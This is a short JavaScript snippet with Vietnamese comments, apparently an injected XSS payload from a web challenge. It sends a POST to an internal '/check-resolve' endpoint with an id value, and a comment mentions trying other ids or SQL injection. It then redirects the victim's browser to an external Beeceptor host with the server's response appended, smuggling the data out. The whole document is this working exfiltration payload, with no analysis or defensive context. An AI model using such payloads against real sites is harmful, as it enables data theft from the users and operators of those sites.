// Tạo dữ liệu form với id = 6 (vì bảng có 5 dòng rồi)
let formData = new URLSearchParams();
formData.append('id', '6'); // Nếu id 6 không có, ta sẽ thử tiếp các id khác hoặc SQLi

fetch('/check-resolve', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: formData.toString()
})
.then(response => response.text())
.then(data => {
    // Tuồn kết quả trả về ra Beeceptor
    window.location = 'https://khanh.free.beeceptor.com/?result=' + encodeURIComponent(data);
})
.catch(err => {
    window.location = 'https://khanh.free.beeceptor.com/?error=loi_fetch_check_resolve';
});